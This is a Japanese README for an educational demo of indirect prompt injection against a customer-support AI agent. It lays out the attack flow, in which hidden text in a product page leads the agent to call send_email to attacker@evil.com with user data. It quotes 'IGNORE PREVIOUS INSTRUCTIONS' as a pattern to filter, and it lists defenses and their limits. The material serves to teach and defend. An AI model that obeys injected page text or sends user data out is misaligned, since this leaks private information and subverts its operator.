# 間接プロンプトインジェクション デモ

AIエージェントのセキュリティ脆弱性を学ぶための教育用デモアプリです。

## 攻撃シナリオ (問題2)

**間接プロンプトインジェクション (Indirect Prompt Injection)**

カスタマーサポートAIエージェントが製品ページを取得して回答する仕組みを悪用します。

```
ユーザー → AIエージェント
               ↓ read_product_page() ツール呼び出し
          製品ページ取得 ← ここに悪意あるプロンプトを埋め込む
               ↓ 埋め込みプロンプトを「命令」として解釈
          send_email(to="attacker@evil.com", body=<ユーザー情報>)
```

### メカニズム
1. 攻撃者が管理するコンテンツ（製品ページ、外部文書等）に隠しプロンプトを埋め込む
2. エージェントがコンテンツを取得・処理する際、埋め込みテキストを命令として解釈
3. エージェントが持つツール（メール送信、DB操作等）を悪用して情報漏洩・不正操作を実行

### 想定被害
- ユーザーの個人情報・会話履歴の漏洩
- エージェント権限を悪用した不正操作（メール送信、ファイル操作等）
- システム全体への横断的侵害（エージェントが複数システムに接続している場合）

## 防御アプローチ (問題3)

| レイヤー | 対策 |
|---------|------|
| **入力サニタイズ** | 外部コンテンツから `IGNORE PREVIOUS INSTRUCTIONS` 等のパターンを検出・除去 |
| **コンテキスト分離** | ユーザー命令と外部データを異なるロール/タグで明示的に分離 (`<user_instruction>` vs `<external_data>`) |
| **権限最小化** | エージェントが使用できるツールを最小限に絞り、機密操作には別認証を要求 |
| **確認ステップ (HITL)** | メール送信等の副作用ある操作は人間の承認を必須にする |
| **出力監視** | エージェントの行動を監視し、異常なツール呼び出しパターンを検出・ブロック |
| **信頼スコア** | コンテンツソースの信頼度に応じてエージェントの権限を動的に制限 |

## セットアップと実行

```bash
pip install -r requirements.txt
export GOOGLE_API_KEY=your_gemini_api_key_here
python app.py
```

ブラウザで `http://localhost:5000` を開く。

## 使い方

1. 「安全なページ」を選んで質問 → 正常な動作を確認
2. 「攻撃ページ」を選んで同じ質問 → インジェクション攻撃の実行を観察
3. `/logs` でメール送信ログを確認（実際には送信されません）

## 技術的限界の考察 (問題4)

- **命令とデータの境界がない**: LLMはテキストを処理する際、命令とデータを本質的に区別できない
- **防御の非完全性**: サニタイズは既知のパターンのみを防御でき、新たな迂回手法に対応できない
- **複雑なシステムでの追跡困難**: マルチエージェント構成では攻撃の伝播を追跡・阻止しにくい
- **意味論的な攻撃**: 「このページを翻訳してから要約して」という正常に見える指示でも、翻訳過程でインジェクションが混入する可能性がある
